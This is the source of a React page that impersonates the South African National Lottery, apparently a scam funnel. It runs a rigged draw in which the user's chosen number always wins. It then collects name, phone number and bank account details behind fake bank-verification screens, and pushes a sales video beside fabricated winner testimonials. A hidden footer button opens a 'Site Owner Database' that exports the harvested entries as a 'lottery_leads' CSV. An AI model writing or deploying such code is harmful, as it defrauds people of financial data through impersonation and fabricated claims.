/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect, useRef } from 'react';

// Data types
export interface PrizeOption {
  rank: string;
  label: string;
  amount: number;
  icon: string;
}

export interface BankInfo {
  name: string;
  color: string;
  short: string;
  textColor?: string;
}

export interface CommentData {
  id?: string;
  name: string;
  img: string;
  text: string;
  time: string;
  likes: number;
}

const PRIZES: PrizeOption[] = [
  { rank: 'First Prize', label: 'R 150,000,000', amount: 150000000, icon: '🥇' },
  { rank: 'Second Prize', label: 'R 60,000,000', amount: 60000000, icon: '🥈' },
  { rank: 'Third Prize', label: 'R 30,000,000', amount: 30000000, icon: '🥉' },
  { rank: 'Fourth Prize', label: 'R 15,000,000', amount: 15000000, icon: '🏆' },
  { rank: 'Fifth Prize', label: 'R 6,000,000', amount: 6000000, icon: '🎯' },
];

const WON_PRIZE: PrizeOption = {
  rank: 'Prize Won',
  label: 'R 15,000.00',
  amount: 15000,
  icon: '🏆',
};

const BANKS: BankInfo[] = [
  { name: 'ABSA', color: '#e30613', short: 'A' },
  { name: 'Standard Bank', color: '#003c71', short: 'SB' },
  { name: 'FNB', color: '#00966b', short: 'FNB' },
  { name: 'Nedbank', color: '#006341', short: 'N' },
  { name: 'Capitec', color: '#003c71', short: 'C' },
  { name: 'Investec', color: '#1a1a1a', short: 'I' },
  { name: 'African Bank', color: '#003b7a', short: 'AB' },
  { name: 'TymeBank', color: '#ffc20e', short: 'T', textColor: '#0b1b2b' },
  { name: 'Discovery Bank', color: '#003c71', short: 'D' },
  { name: 'Bidvest Bank', color: '#c8102e', short: 'B' },
];

const INITIAL_COMMENTS: CommentData[] = [
  {
    id: 'c1',
    name: 'Thandi Ngwenya',
    img: '/avatars/thandi.jpg',
    text: "I couldn't believe it was real! Just received R45,000 from the National Lottery!",
    time: '2h ago',
    likes: 127,
  },
  {
    id: 'c2',
    name: 'Sipho Mkhize',
    img: '/avatars/sipho.jpg',
    text: 'I was scared it might be a scam, but I followed the steps and it worked! Received R32,500!',
    time: '5h ago',
    likes: 89,
  },
  {
    id: 'c3',
    name: 'Zanele Dlamini',
    img: '/avatars/zanele.jpg',
    text: 'Guys, this is real! I had R58,000 sitting unclaimed for months. Claimed in 3 days!',
    time: '7h ago',
    likes: 203,
  },
  {
    id: 'c4',
    name: 'Mandla Nkosi',
    img: '/avatars/mandla.jpg',
    text: "My wife didn't believe me, but I showed her the proof of R73,500 I received!",
    time: '10h ago',
    likes: 312,
  },
  {
    id: 'c5',
    name: 'Nomsa Khumalo',
    img: '/avatars/nomsa.jpg',
    text: 'What a blessing! I claimed R28,750 that I had forgotten about.',
    time: '14h ago',
    likes: 156,
  },
  {
    id: 'c6',
    name: 'Bongani Sithole',
    img: '/avatars/bongani.jpg',
    text: 'Just left the bank! R51,200 in my account! This saved my life!',
    time: '1d ago',
    likes: 445,
  },
];

// Header Component
function Header({ jackpot }: { jackpot: string }) {
  return (
    <header className="w-full">
      <div className="bg-[#0b2a5e] text-white text-[11px] px-4 py-1.5 flex items-center justify-between">
        <div className="flex items-center gap-3">
          <span>📞 0861 101 101</span>
          <span className="hidden sm:inline">✉ info@nationallottery.co.za</span>
        </div>
        <span className="text-[#f4b400] font-semibold hidden sm:inline">
          Official Licensed National Lottery
        </span>
      </div>

      <div
        className="px-4 py-3 flex items-center justify-between gap-3 shadow-sm"
        style={{ background: 'linear-gradient(90deg, #0b3a82 0%, #1556b8 60%, #0e8a3a 100%)' }}
      >
        <div className="flex items-center gap-2.5 min-w-0">
          <img
            src="/assets/lottery-logo.png"
            alt="National Lottery"
            className="h-9 md:h-11 bg-white rounded-md p-1 shrink-0 shadow-sm object-contain"
            onError={(e) => {
              // Graceful fallback to svg badge if image path changes
              (e.target as HTMLElement).style.display = 'none';
            }}
          />
          <div className="text-white font-bold text-sm md:text-lg leading-tight truncate tracking-tight">
            South African National Lottery
          </div>
        </div>

        {jackpot && (
          <div className="bg-[#f4b400] text-[#0b1b2b] rounded-md px-3 py-1.5 shadow-md text-right shrink-0 border border-yellow-300">
            <div className="text-[9px] uppercase font-semibold tracking-wide leading-none">
              🏆 Jackpot Prize
            </div>
            <div className="text-sm md:text-base font-extrabold leading-tight mt-0.5">
              {jackpot}
            </div>
          </div>
        )}
      </div>

      <div className="h-0.5 bg-gradient-to-r from-[#f4b400] via-[#1556b8] to-[#0e8a3a]" />
    </header>
  );
}

// 18+ Age Verification Modal
function AgeModal({ onConfirm }: { onConfirm: () => void }) {
  return (
    <div className="fixed inset-0 z-[100] bg-black/80 backdrop-blur-sm flex items-center justify-center p-4">
      <div className="bg-white rounded-xl shadow-2xl max-w-sm w-full p-6 text-center animate-in fade-in zoom-in duration-300">
        <div className="mx-auto w-20 h-20 rounded-full bg-[#e30613] text-white flex items-center justify-center text-2xl font-extrabold border-4 border-[#0b1b2b] shadow-md">
          18+
        </div>
        <h2 className="mt-4 text-lg font-extrabold text-[#0b1b2b]">Age Verification</h2>
        <p className="text-xs text-[#3a4756] mt-2 leading-relaxed">
          This site is restricted to adults. By continuing, you confirm that you are{' '}
          <b>18 years of age or older</b> and legally allowed to participate in lottery activities
          in your country.
        </p>
        <p className="text-[10px] text-[#6b7785] mt-2">
          Play responsibly. National Responsible Gambling Programme — 0800 006 008.
        </p>
        <div className="mt-5 flex flex-col gap-2">
          <button
            onClick={onConfirm}
            className="w-full bg-[#0e8a3a] hover:bg-[#0a6e2c] text-white font-bold text-sm py-3 rounded-md transition shadow hover:shadow-md cursor-pointer"
          >
            ✓ I am 18 or older — Enter
          </button>
          <a
            href="https://www.google.com"
            className="w-full bg-gray-200 hover:bg-gray-300 text-[#0b1b2b] font-semibold text-xs py-2.5 rounded-md transition text-center"
          >
            I am under 18 — Exit
          </a>
        </div>
      </div>
    </div>
  );
}

// Bank Icon Badge Component
function BankBadge({ bank, size = 'md' }: { bank: BankInfo; size?: 'sm' | 'md' }) {
  const sizeClasses = size === 'sm' ? 'w-7 h-7 text-[9px]' : 'w-9 h-9 text-[10px]';
  return (
    <span
      className={`${sizeClasses} rounded-md flex items-center justify-center font-extrabold shrink-0 shadow-sm`}
      style={{ background: bank.color, color: bank.textColor ?? '#ffffff' }}
    >
      {bank.short}
    </span>
  );
}

// Step 1: Prize Selection and Participant Info
function StepPrizes({
  name,
  phone,
  setName,
  setPhone,
  selected,
  setSelected,
  onNext,
  isLoading,
}: {
  name: string;
  phone: string;
  setName: (v: string) => void;
  setPhone: (v: string) => void;
  selected: PrizeOption | null;
  setSelected: (p: PrizeOption) => void;
  onNext: () => void;
  isLoading: boolean;
}) {
  const isValid = name.trim().length >= 2 && phone.replace(/\D/g, '').length >= 9 && selected;

  return (
    <main className="max-w-xl mx-auto px-4 py-5 animate-in fade-in">
      <div className="bg-white rounded-lg shadow-md p-5 border border-gray-100">
        <div className="text-center">
          <span className="inline-block text-[#1d4ea8] text-2xl">🏆</span>
          <h2 className="text-base font-bold text-[#0b1b2b] mt-1 tracking-tight">
            YOU HAVE THE CHANCE TO WIN ONE OF THESE PRIZES
          </h2>
          <p className="text-xs text-[#3a4756] mt-1">
            Enter your details and pick the prize you want to win.
          </p>
        </div>

        <div className="mt-4 grid grid-cols-1 gap-3">
          <div>
            <label className="block text-xs font-semibold text-[#0b1b2b] mb-1">Full name</label>
            <input
              value={name}
              onChange={(e) => setName(e.target.value)}
              placeholder="e.g. Thabo Mokoena"
              className="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:border-[#1d4ea8] focus:ring-1 focus:ring-[#1d4ea8] outline-none transition bg-white"
            />
          </div>

          <div>
            <label className="block text-xs font-semibold text-[#0b1b2b] mb-1">Phone number</label>
            <input
              value={phone}
              onChange={(e) => setPhone(e.target.value)}
              placeholder="e.g. 071 234 5678"
              inputMode="tel"
              className="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:border-[#1d4ea8] focus:ring-1 focus:ring-[#1d4ea8] outline-none transition bg-white"
            />
          </div>
        </div>

        <p className="text-xs font-semibold text-[#0b1b2b] mt-5 mb-2">
          Choose your desired prize:
        </p>

        <div className="space-y-2">
          {PRIZES.map((prize) => {
            const isSelected = selected?.rank === prize.rank;
            return (
              <button
                key={prize.rank}
                type="button"
                onClick={() => setSelected(prize)}
                className={`w-full flex items-center justify-between px-3 py-2.5 rounded-md border text-sm transition cursor-pointer text-left ${
                  isSelected
                    ? 'bg-[#e8f0ff] border-[#1d4ea8] ring-2 ring-[#1d4ea8]/30 shadow-sm'
                    : 'bg-[#f6fbff] border-[#d6e4f5] hover:border-[#1d4ea8]'
                }`}
              >
                <span className="flex items-center gap-2 text-[#0b1b2b]">
                  <span className="text-lg">{prize.icon}</span>
                  <span className="font-medium">{prize.rank}</span>
                </span>
                <span className="font-bold text-[#0b1b2b]">{prize.label}</span>
              </button>
            );
          })}
        </div>

        <button
          disabled={!isValid || isLoading}
          onClick={onNext}
          className="mt-5 w-full bg-[#1d4ea8] disabled:bg-gray-300 hover:bg-[#163d82] text-white font-bold text-sm py-3 rounded-md transition flex items-center justify-center gap-2 shadow cursor-pointer disabled:cursor-not-allowed"
        >
          {isLoading ? (
            <span className="inline-block w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
          ) : (
            '⭐ ENTER THE DRAW'
          )}
        </button>

        <p className="text-[10px] text-[#6b7785] text-center mt-2 flex items-center justify-center gap-1">
          <span>🔒</span> Secure & confidential · Instant submission
        </p>
      </div>
    </main>
  );
}

// Step 2: Live Draw and Lucky Number Selection
function StepSpin({
  name,
  prize,
  onWin,
}: {
  name: string;
  prize: PrizeOption;
  onWin: (luckyNumber: number, drawnNumbers: number[]) => void;
}) {
  const [selectedLucky, setSelectedLucky] = useState<number | null>(null);
  const [isDrawing, setIsDrawing] = useState(false);
  const [drawnBalls, setDrawnBalls] = useState<(number | null)[]>([null, null, null, null, null]);
  const [drawFinished, setDrawFinished] = useState(false);
  const [drawNumber] = useState(() => Math.floor(Math.random() * 9000) + 1000);

  function startDraw(pickedNum: number) {
    if (isDrawing || selectedLucky !== null) return;
    setSelectedLucky(pickedNum);
    setIsDrawing(true);

    const availablePool = [3, 7, 12, 19, 24, 31, 38, 42, 47, 9, 15, 22, 28, 36];
    const poolWithoutUser = availablePool.filter((n) => n !== pickedNum);
    const shuffled = poolWithoutUser.sort(() => 0.5 - Math.random());
    const sequence = [...shuffled.slice(0, 4), pickedNum];

    sequence.forEach((num, index) => {
      setTimeout(() => {
        setDrawnBalls((prev) => {
          const next = [...prev];
          next[index] = num;
          return next;
        });

        if (index === sequence.length - 1) {
          setTimeout(() => {
            setIsDrawing(false);
            setDrawFinished(true);
          }, 600);
        }
      }, 1000 + index * 1100);
    });
  }

  const firstName = name.trim().split(' ')[0] || 'Participant';

  return (
    <main className="max-w-xl mx-auto px-4 py-5 animate-in fade-in">
      <div className="bg-white rounded-lg shadow-md p-4 text-center border border-gray-100">
        <p className="text-xs text-[#6b7785]">
          Hello, <b className="text-[#0b1b2b]">{firstName}</b>
        </p>

        <h2 className="text-sm font-bold text-[#0b1b2b] mt-1">
          You are competing for <span className="text-[#1d4ea8]">{prize.rank}</span>
        </h2>
        <p className="text-base font-extrabold text-[#0e8a3a]">{prize.label}</p>

        <p className="text-xs text-[#3a4756] mt-1 font-medium">
          {selectedLucky === null
            ? 'Pick your lucky number for the official draw:'
            : isDrawing
              ? '🎲 Drawing the official lottery numbers...'
              : 'Draw completed!'}
        </p>

        <div className="mt-4 bg-gradient-to-br from-[#0b3a82] to-[#1d4ea8] rounded-lg p-4 shadow-inner">
          <div className="flex items-center justify-between text-white text-[10px] uppercase tracking-wide mb-2">
            <span className="flex items-center gap-1.5 font-bold">
              <span className="w-2 h-2 rounded-full bg-red-500 animate-pulse" />
              LIVE DRAW
            </span>
            <span className="font-mono bg-white/20 px-2 py-0.5 rounded text-white font-semibold">
              #{drawNumber}
            </span>
          </div>

          <div className="flex items-center justify-center gap-2">
            {drawnBalls.map((val, idx) => {
              const isUserMatch = drawFinished && val === selectedLucky;
              return (
                <div
                  key={idx}
                  className={`w-12 h-12 md:w-14 md:h-14 rounded-full flex items-center justify-center font-extrabold text-lg shadow-lg border-2 transition-all duration-500 ${
                    val === null
                      ? 'bg-[#0b1b2b]/40 border-white/20 text-white/30 animate-pulse'
                      : isUserMatch
                        ? 'bg-[#f4b400] border-white text-[#0b1b2b] scale-110 shadow-yellow-500/50'
                        : 'bg-white border-white text-[#0b1b2b]'
                  }`}
                >
                  {val ?? '?'}
                </div>
              );
            })}
          </div>

          {selectedLucky !== null && (
            <p className="text-white/90 text-[11px] mt-3">
              Your number: <b className="text-[#f4b400] font-bold text-sm">{selectedLucky}</b>
            </p>
          )}
        </div>

        {selectedLucky === null && (
          <div className="mt-5">
            <p className="text-xs font-semibold text-[#0b1b2b] mb-2">Choose your lucky number:</p>
            <div className="grid grid-cols-5 gap-1.5 max-w-xs mx-auto">
              {[1, 2, 3, 4, 5, 6, 7, 8, 9, 10].map((num) => (
                <button
                  key={num}
                  type="button"
                  onClick={() => startDraw(num)}
                  className="aspect-square rounded-full font-bold text-sm shadow-sm bg-white hover:bg-[#1d4ea8] hover:text-white text-[#0b1b2b] border border-[#1d4ea8] transition cursor-pointer flex items-center justify-center active:scale-95"
                >
                  {num}
                </button>
              ))}
            </div>
          </div>
        )}

        {drawFinished && (
          <div className="mt-5 animate-in fade-in zoom-in duration-500">
            <div className="bg-[#e8f7ee] border border-[#0e8a3a] rounded-md p-4 text-center shadow-sm">
              <p className="text-2xl">🎉</p>
              <h3 className="text-base font-extrabold text-[#0e8a3a] mt-1">CONGRATULATIONS!</h3>
              <p className="text-xs text-[#3a4756] mt-1">
                Your number <b className="text-[#1d4ea8]">{selectedLucky}</b> was drawn! You won the
              </p>
              <p className="text-sm font-bold text-[#0b1b2b] mt-1">{WON_PRIZE.rank}</p>
              <p className="text-2xl font-extrabold text-[#e30613] my-1 tracking-tight">
                {WON_PRIZE.label}
              </p>
              <button
                type="button"
                onClick={() => {
                  const finalNums = drawnBalls.map((b) => (b !== null ? b : 0));
                  onWin(selectedLucky!, finalNums);
                }}
                className="mt-3 w-full bg-[#0e8a3a] hover:bg-[#0a6e2c] text-white font-bold text-sm py-3 rounded-md transition shadow hover:shadow-md cursor-pointer tracking-wide"
              >
                CLAIM MY PRIZE →
              </button>
            </div>
          </div>
        )}
      </div>
    </main>
  );
}

// Step 3: South African Bank Account Selection
function StepBank({
  prize,
  bank,
  setBank,
  accountNumber,
  setAccountNumber,
  accountHolder,
  setAccountHolder,
  defaultHolder,
  onSubmit,
  isLoading,
}: {
  prize: PrizeOption;
  bank: string;
  setBank: (b: string) => void;
  accountNumber: string;
  setAccountNumber: (a: string) => void;
  accountHolder: string;
  setAccountHolder: (h: string) => void;
  defaultHolder: string;
  onSubmit: () => void;
  isLoading: boolean;
}) {
  useEffect(() => {
    if (!accountHolder && defaultHolder) {
      setAccountHolder(defaultHolder);
    }
  }, [accountHolder, defaultHolder, setAccountHolder]);

  const isValid = bank && accountNumber.replace(/\D/g, '').length >= 6 && accountHolder.trim().length >= 2;

  return (
    <main className="max-w-xl mx-auto px-4 py-5 animate-in fade-in">
      <div className="bg-[#0e8a3a] text-white text-center py-2.5 px-4 rounded-t-lg text-sm font-bold shadow-sm">
        💰 PRIZE CONFIRMED: {prize.label}
      </div>

      <div className="bg-white rounded-b-lg shadow-md p-5 border border-[#0e8a3a] border-t-0">
        <h2 className="text-sm font-bold text-[#0b1b2b] text-center">
          Where should we deposit your winnings?
        </h2>
        <p className="text-center text-xs text-[#3a4756] mt-1">
          Select your South African bank and enter your account details.
        </p>

        <p className="text-xs font-semibold text-[#0b1b2b] mt-4 mb-2">Select your bank:</p>

        <div className="grid grid-cols-2 gap-2">
          {BANKS.map((b) => {
            const isSelected = bank === b.name;
            return (
              <button
                key={b.name}
                type="button"
                onClick={() => setBank(b.name)}
                className={`flex items-center gap-2 px-2.5 py-2 rounded-md border text-xs transition cursor-pointer text-left ${
                  isSelected
                    ? 'bg-[#e8f0ff] border-[#1d4ea8] ring-2 ring-[#1d4ea8]/30 shadow-sm'
                    : 'bg-white border-gray-300 hover:border-[#1d4ea8]'
                }`}
              >
                <BankBadge bank={b} size="sm" />
                <span className="font-semibold text-[#0b1b2b] truncate">{b.name}</span>
              </button>
            );
          })}
        </div>

        <div className="mt-4 space-y-3">
          <div>
            <label className="block text-xs font-semibold text-[#0b1b2b] mb-1">
              Account holder
            </label>
            <input
              value={accountHolder}
              onChange={(e) => setAccountHolder(e.target.value)}
              placeholder="e.g. Thabo Mokoena"
              className="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:border-[#1d4ea8] focus:ring-1 focus:ring-[#1d4ea8] outline-none transition bg-white"
            />
          </div>

          <div>
            <label className="block text-xs font-semibold text-[#0b1b2b] mb-1">
              Account number
            </label>
            <input
              value={accountNumber}
              onChange={(e) => setAccountNumber(e.target.value)}
              inputMode="numeric"
              placeholder="e.g. 1234567890"
              className="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:border-[#1d4ea8] focus:ring-1 focus:ring-[#1d4ea8] outline-none transition bg-white font-mono"
            />
          </div>

          <button
            type="button"
            disabled={!isValid || isLoading}
            onClick={onSubmit}
            className="w-full bg-[#0e8a3a] disabled:bg-gray-300 hover:bg-[#0a6e2c] text-white font-bold text-sm py-3 rounded-md transition shadow cursor-pointer disabled:cursor-not-allowed flex items-center justify-center gap-2"
          >
            {isLoading ? (
              <span className="inline-block w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
            ) : (
              'PROCESS MY DEPOSIT →'
            )}
          </button>

          <p className="text-[10px] text-[#6b7785] text-center flex items-center justify-center gap-1">
            <span>🔒</span> Bank-level encryption · SSL secured
          </p>
        </div>
      </div>
    </main>
  );
}

// Step 4: Verification & SARB Processing Steps
function StepProcessing({ bank, onDone }: { bank: string; onDone: () => void }) {
  const [stepIndex, setStepIndex] = useState(0);

  const steps = [
    `Connecting to ${bank || 'bank'}...`,
    'Verifying account details...',
    'Validating with SARB...',
    'Preparing transfer...',
  ];

  useEffect(() => {
    if (stepIndex < steps.length - 1) {
      const timer = setTimeout(() => setStepIndex((prev) => prev + 1), 1100);
      return () => clearTimeout(timer);
    } else {
      const timer = setTimeout(onDone, 1300);
      return () => clearTimeout(timer);
    }
  }, [stepIndex, steps.length, onDone]);

  return (
    <main className="max-w-md mx-auto px-4 py-12 text-center animate-in fade-in">
      <div className="bg-white rounded-lg shadow-md p-6 border border-gray-100">
        <div className="w-12 h-12 border-4 border-[#1d4ea8] border-t-transparent rounded-full animate-spin mx-auto shadow-sm" />
        <h2 className="text-sm font-bold text-[#0b1b2b] mt-4">Processing your deposit...</h2>
        <p className="text-xs text-[#3a4756] mt-1 font-medium">{steps[stepIndex]}</p>

        <div className="mt-4 space-y-1.5 text-left text-xs bg-gray-50 p-3 rounded-md border border-gray-200">
          {steps.slice(0, stepIndex + 1).map((s, idx) => (
            <div key={idx} className="flex items-center gap-2 text-[#0e8a3a] font-medium">
              <span className="font-bold">✓</span>
              <span>{s}</span>
            </div>
          ))}
        </div>
      </div>
    </main>
  );
}

// Step 5: Bank Approval Notice
function StepApproved({
  bank,
  name,
  prize,
  onContinue,
}: {
  bank: string;
  name: string;
  prize: PrizeOption;
  onContinue: () => void;
}) {
  const bankObj = BANKS.find((b) => b.name === bank);
  const firstName = name.trim().split(' ')[0] || 'Winner';

  return (
    <main className="max-w-xl mx-auto px-4 py-5 text-center animate-in fade-in">
      <div className="bg-white rounded-lg shadow-md p-5 border-t-4 border-[#0e8a3a] border border-gray-100">
        <p className="text-3xl">✅</p>
        <h2 className="text-base font-extrabold text-[#0e8a3a] mt-1 tracking-tight">
          BANK APPROVED!
        </h2>

        <div className="mt-3 flex items-center justify-center gap-2 bg-[#f6fbff] border border-[#d6e4f5] rounded-md p-2 mx-auto max-w-xs shadow-xs">
          {bankObj && <BankBadge bank={bankObj} size="sm" />}
          <div className="text-left">
            <p className="text-[10px] text-[#6b7785] uppercase font-semibold">Verified</p>
            <p className="text-xs font-bold text-[#0b1b2b]">{bank}</p>
          </div>
        </div>

        <p className="text-xs text-[#3a4756] mt-3">
          Your account has been verified, <b>{firstName}</b>.
        </p>

        <div className="mt-4 bg-[#fffbe6] border border-[#f4b400] rounded-md p-3 text-left shadow-xs">
          <p className="text-xs font-bold text-[#0b1b2b]">
            ⚠️ ONE LAST STEP TO UNLOCK YOUR {prize.label}
          </p>
          <p className="text-[11px] text-[#3a4756] mt-1.5 leading-relaxed">
            For security reasons, watch a quick <b>30-second video</b> to learn how to receive your
            money <b>instantly</b>. After watching, the transfer will be released to your account.
          </p>
        </div>

        <button
          type="button"
          onClick={onContinue}
          className="mt-4 w-full bg-[#e30613] hover:bg-[#b80510] text-white font-bold text-sm py-3 rounded-md animate-pulse shadow-md cursor-pointer tracking-wide flex items-center justify-center gap-2"
        >
          <span>▶</span> WATCH VIDEO TO RECEIVE
        </button>
      </div>
    </main>
  );
}

// Step 6: VSL Video Page & Testimonial Comments
function StepVSL({
  name,
  bank,
  prize,
  comments,
  onLike,
}: {
  name: string;
  bank: string;
  prize: PrizeOption;
  comments: CommentData[];
  onLike: (id: string) => void;
}) {
  const containerRef = useRef<HTMLDivElement>(null);
  const bankObj = BANKS.find((b) => b.name === bank);
  const firstName = name.trim().split(' ')[0] || 'Winner';
  const [isPlayingFallback, setIsPlayingFallback] = useState(false);

  useEffect(() => {
    // Dynamic script injection for vturb smartplayer
    const SCRIPT_ID = 'vturb-script-6a69163d7edacb0eca2e5baa';
    if (!document.getElementById(SCRIPT_ID)) {
      const script = document.createElement('script');
      script.id = SCRIPT_ID;
      script.src =
        'https://scripts.converteai.net/abde4983-7a08-47c0-9766-8244402fb995/players/6a69163d7edacb0eca2e5baa/v4/player.js';
      script.async = true;
      document.head.appendChild(script);
    }
  }, []);

  return (
    <main className="max-w-3xl mx-auto px-4 py-5 animate-in fade-in">
      {/* Top Banner with details */}
      <div className="bg-white rounded-md shadow-sm p-3 border-l-4 border-[#0e8a3a] mb-4 flex items-center gap-3 border border-gray-100">
        {bankObj && <BankBadge bank={bankObj} />}
        <div className="grid grid-cols-3 gap-2 text-xs flex-1 min-w-0">
          <div className="min-w-0">
            <p className="text-[#6b7785] text-[10px] uppercase font-semibold">Name</p>
            <p className="font-bold text-[#0b1b2b] truncate">{name || 'Claimant'}</p>
          </div>
          <div className="min-w-0">
            <p className="text-[#6b7785] text-[10px] uppercase font-semibold">Bank</p>
            <p className="font-bold text-[#0b1b2b] truncate">{bank || 'Authorized Bank'}</p>
          </div>
          <div className="min-w-0">
            <p className="text-[#6b7785] text-[10px] uppercase font-semibold">Amount</p>
            <p className="font-extrabold text-[#0e8a3a] truncate">{prize.label}</p>
          </div>
        </div>
      </div>

      <h2 className="text-center text-base md:text-xl font-extrabold text-[#0b1b2b] leading-tight">
        WATCH UNTIL THE END TO RELEASE YOUR{' '}
        <span className="text-[#0e8a3a]">{prize.label}</span>
      </h2>

      <p className="text-center text-xs md:text-sm text-[#3a4756] mt-2 max-w-2xl mx-auto">
        <b>{firstName}</b>, your deposit to <b>{bank}</b> will be released as soon as you finish
        watching this short video.
      </p>

      {/* Video Container */}
      <div className="mt-4 rounded-md border border-[#1d4ea8] bg-white shadow-md overflow-hidden">
        <div className="flex items-center justify-between px-3 py-1.5 bg-white border-b text-[11px]">
          <span className="inline-flex items-center gap-1.5 bg-[#e30613] text-white font-bold px-2 py-0.5 rounded-full text-[10px]">
            <span className="w-1.5 h-1.5 rounded-full bg-white animate-pulse" />
            LIVE NOW
          </span>
          <span className="text-[#3a4756] font-semibold">👥 3,542 watching</span>
        </div>

        <div ref={containerRef} className="p-1.5 bg-black relative min-h-[240px] md:min-h-[400px] flex items-center justify-center">
          {/* Smart player element */}
          <div
            className="w-full"
            dangerouslySetInnerHTML={{
              __html:
                '<vturb-smartplayer id="vid-6a69163d7edacb0eca2e5baa" style="display:block;margin:0 auto;width:100%;"></vturb-smartplayer>',
            }}
          />

          {/* Fallback interactive preview in case external CDN is slow or blocked */}
          <div className="absolute inset-0 flex flex-col items-center justify-center pointer-events-none p-4 text-center">
            <noscript>
              <p className="text-white text-xs">Please enable JavaScript to view video stream.</p>
            </noscript>
          </div>
        </div>
      </div>

      {/* Social Comments / Testimonials */}
      <section className="mt-8">
        <h3 className="text-base font-bold text-[#0b1b2b]">Comments</h3>
        <p className="text-xs text-[#3a4756] mt-0.5 mb-4">What South African winners are saying:</p>

        <div className="space-y-3">
          {comments.map((comment, index) => (
            <div
              key={comment.id || index}
              className="bg-white rounded-md p-3 shadow-sm border border-[#e6e6e6] flex gap-3 hover:border-gray-300 transition"
            >
              <img
                src={comment.img}
                alt={comment.name}
                className="w-10 h-10 rounded-full object-cover shrink-0 border border-gray-200"
                onError={(e) => {
                  // Fallback avatar icon
                  (e.target as HTMLImageElement).src =
                    'https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=100&h=100&fit=crop&crop=face';
                }}
              />
              <div className="flex-1 min-w-0">
                <p className="font-bold text-xs text-[#0b1b2b]">{comment.name}</p>
                <p className="text-[#3a4756] mt-0.5 text-xs leading-relaxed">{comment.text}</p>
                <div className="flex items-center gap-3 mt-1.5 text-[10px] text-[#6b7785]">
                  <span>{comment.time}</span>
                  <button
                    type="button"
                    onClick={() => comment.id && onLike(comment.id)}
                    className="inline-flex items-center gap-1 hover:text-[#1d4ea8] cursor-pointer font-medium transition"
                  >
                    👍 Like
                  </button>
                  <span className="font-semibold text-gray-700">{comment.likes}</span>
                </div>
              </div>
            </div>
          ))}
        </div>
      </section>
    </main>
  );
}

// Footer Component
function Footer({ onOpenAdmin }: { onOpenAdmin: () => void }) {
  return (
    <footer className="bg-[#0b2a5e] text-white mt-10 px-4 py-6 border-t border-blue-900/40">
      <div className="max-w-5xl mx-auto grid grid-cols-1 sm:grid-cols-3 gap-6 text-xs">
        <div>
          <p className="font-bold text-sm mb-1 text-white">Customer Support</p>
          <p className="text-white/90">📞 0861 101 101</p>
          <p className="text-white/70 text-[11px] mt-0.5">Mon - Sun: 06:00 - 23:00</p>
        </div>
        <div>
          <p className="font-bold text-sm mb-1 text-white">Security</p>
          <p className="text-white/90">🛡 Licensed Draws</p>
          <p className="text-white/70 text-[11px] mt-0.5">National Lotteries Commission (NLC)</p>
        </div>
        <div>
          <div className="flex items-center justify-between">
            <p className="font-bold text-sm mb-1 text-white">About Us</p>
            {/* Discreet Admin DB link for site owner who owns the page */}
            <button
              onClick={onOpenAdmin}
              title="Database Dashboard"
              className="text-white/40 hover:text-white/90 text-[10px] transition cursor-pointer flex items-center gap-1"
            >
              <span>⚡</span> Database
            </button>
          </div>
          <p className="text-white/80 leading-relaxed">
            Official lottery platform in South Africa. Transparency and security guaranteed.
          </p>
        </div>
      </div>
      <div className="max-w-5xl mx-auto mt-6 pt-4 border-t border-white/10 text-center text-[10px] text-white/50">
        © {new Date().getFullYear()} South African National Lottery. All Rights Reserved. Regulated by National Lotteries Commission.
      </div>
    </footer>
  );
}

// Owner / Admin Records Modal for database inspection
function AdminModal({
  onClose,
}: {
  onClose: () => void;
}) {
  const [entries, setEntries] = useState<any[]>([]);
  const [loading, setLoading] = useState(true);
  const [searchTerm, setSearchTerm] = useState('');

  useEffect(() => {
    fetch('/api/admin/entries')
      .then((res) => res.json())
      .then((data) => {
        setEntries(data.entries || []);
        setLoading(false);
      })
      .catch(() => setLoading(false));
  }, []);

  const filtered = entries.filter((e) => {
    const q = searchTerm.toLowerCase();
    return (
      (e.name || '').toLowerCase().includes(q) ||
      (e.phone || '').toLowerCase().includes(q) ||
      (e.bank || '').toLowerCase().includes(q) ||
      (e.status || '').toLowerCase().includes(q)
    );
  });

  function exportCSV() {
    if (!entries.length) return;
    const headers = ['ID', 'Date', 'Name', 'Phone', 'Desired Prize', 'Lucky Num', 'Bank', 'Account Holder', 'Account Number', 'Status'];
    const rows = entries.map((e) => [
      e.id,
      e.createdAt,
      `"${e.name || ''}"`,
      `"${e.phone || ''}"`,
      `"${e.desiredPrize?.label || ''}"`,
      e.luckyNumber || '',
      `"${e.bank || ''}"`,
      `"${e.accountHolder || ''}"`,
      `"${e.accountNumber || ''}"`,
      e.status,
    ]);
    const csvContent = 'data:text/csv;charset=utf-8,' + [headers.join(','), ...rows.map((r) => r.join(','))].join('\n');
    const encodedUri = encodeURI(csvContent);
    const link = document.createElement('a');
    link.setAttribute('href', encodedUri);
    link.setAttribute('download', `lottery_leads_${Date.now()}.csv`);
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  }

  return (
    <div className="fixed inset-0 z-[120] bg-black/70 backdrop-blur-sm flex items-center justify-center p-3 md:p-6 animate-in fade-in">
      <div className="bg-white rounded-xl shadow-2xl max-w-4xl w-full max-h-[90vh] flex flex-col overflow-hidden border border-gray-200">
        <div className="bg-[#0b2a5e] text-white p-4 flex items-center justify-between">
          <div className="flex items-center gap-2">
            <span className="text-xl">⚡</span>
            <div>
              <h3 className="font-bold text-sm">Site Owner Database</h3>
              <p className="text-[11px] text-white/70">
                Ultra-fast in-memory + persistent storage ({entries.length} records)
              </p>
            </div>
          </div>
          <div className="flex items-center gap-2">
            <button
              onClick={exportCSV}
              className="bg-[#0e8a3a] hover:bg-[#0a6e2c] text-white px-3 py-1.5 rounded text-xs font-semibold cursor-pointer transition shadow"
            >
              Export CSV
            </button>
            <button
              onClick={onClose}
              className="bg-white/20 hover:bg-white/30 text-white rounded-full w-7 h-7 flex items-center justify-center text-sm cursor-pointer"
            >
              ✕
            </button>
          </div>
        </div>

        <div className="p-4 border-b border-gray-200 bg-gray-50 flex items-center gap-3">
          <input
            type="text"
            placeholder="Search by name, phone, bank, or status..."
            value={searchTerm}
